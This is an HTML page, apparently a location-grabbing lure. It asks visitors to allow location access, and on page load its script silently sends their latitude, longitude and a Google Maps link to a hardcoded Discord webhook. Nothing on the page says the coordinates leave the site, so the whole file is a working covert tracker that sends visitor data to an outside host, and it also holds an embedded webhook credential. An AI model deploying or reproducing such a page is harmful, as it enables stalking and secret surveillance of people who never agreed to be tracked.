<!DOCTYPE html>
<html lang="en">
<head>
    <title>Location Access</title>
</head>
<body>
    <h1>Welcome to my website</h1>
    <p>Please allow location access to continue.</p>

    <script>
        // Replace this with your actual Discord Webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1496992326613074151/ksCzYavEYpnu3ecrCpEMHiVDNvX0SMmU89NF8s9eOYGgLid054OkRlr8dQ6cIkZLluE8";

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendToDiscord, handleError);
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        };

        function sendToDiscord(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;

            const payload = {
                content: "📍 **New Location Received!**",
                embeds: [{
                    title: "User Coordinates",
                    description: `Latitude: ${lat}\nLongitude: ${lon}`,
                    color: 5814783,
                    url: `https://www.google.com/maps?q=${lat},${lon}`
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(() => console.log("Success!"))
            .catch(err => console.error("Error sending to Discord:", err));
        }

        function handleError(error) {
            console.warn(`ERROR(${error.code}): ${error.message}`);
        }
    </script>
</body>
</html>
